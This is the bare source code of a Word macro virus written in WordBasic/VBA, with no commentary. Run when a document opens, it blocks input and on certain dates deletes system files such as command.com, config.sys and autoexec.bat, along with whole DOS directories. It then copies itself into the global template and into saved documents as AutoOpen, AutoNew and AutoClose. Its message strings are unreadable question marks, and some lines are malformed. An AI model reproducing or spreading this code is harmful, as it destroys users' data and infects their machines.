   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim Answer$
   Dim nor
   Dim kk
   Dim t
   Dim file$
   Dim filem$
   Dim nor1
   Dim kkk
   Dim tt
   WordBasic.DisableInput 1
   try:
   On Error GoTo -1: On Error GoTo try
   Err.Number = 0
   If WordBasic.Day(WordBasic.Now()) = 28 Then GoTo questio Else GoTo check

   questio:
   Answer$ = WordBasic.[InputBox$]("??????28???, ??????:??? ??????(mm - dd)???????????(??????????? ??????)", "???????")
   If Answer$ = "9-28" Then GoTo message Else GoTo Die
   message:
    WordBasic.MsgBox "?????????....???....??????????...???????? . . . .???????", "??????,????,? ?", 64
    WordBasic.Kill "c:\config.sys"
    WordBasic.Kill "c:\autoexec.bat"
    WordBasic.Kill "c:\command.com"
   'End If

   Die:
        WordBasic.Kill "c:\dos\*.*"
   WordBasic.MsgBox "?????????????????????DOS???????????????????????", "????", 64
        WordBasic.Kill "c:\et3\*.*"


   check:
   If WordBasic.Day(WordBasic.Now()) = 1 Then Goto WordBasic.Kill Else Goto elf
   WordBasic.Kill:
   WordBasic.Kill "c:\command.com" WordBasic.Kill "c:\autoexec.bat"
   WordBasic.Kill "c:\config.sys"

   elf:
   nor = WordBasic.CountMacros(0)
   If nor > 0 Then
       For kk = 1 To nor
           If WordBasic.[MacroName$](kk, 0) = "AutoOpen" Then
           t = 1
           End If
           Next kk

   End If

   file$ = WordBasic.[FileName$]()
   filem$ = file$ + ":AutoOpen"
   If t <> 1 Then
       WordBasic.MacroCopy filem$, "AutoOpen"
       WordBasic.MacroCopy filem$, "AutoNew"
       WordBasic.MacroCopy filem$, "AutoClose"
   End If

   nor1 = WordBasic.CountMacros(1)
   If nor1 > 0 Then
       For kkk = 1 To nor1
           If WordBasic.[MacroName$](kkk, 1) = "AutoOpen" Then
           tt = 1
           End If
           Next kkk

   End If

   If tt <> 1 Then
       WordBasic.FileSaveAs Format:=1
       WordBasic.MacroCopy "AutoOpen", filem$
   End If



   Exit_:
   End Sub
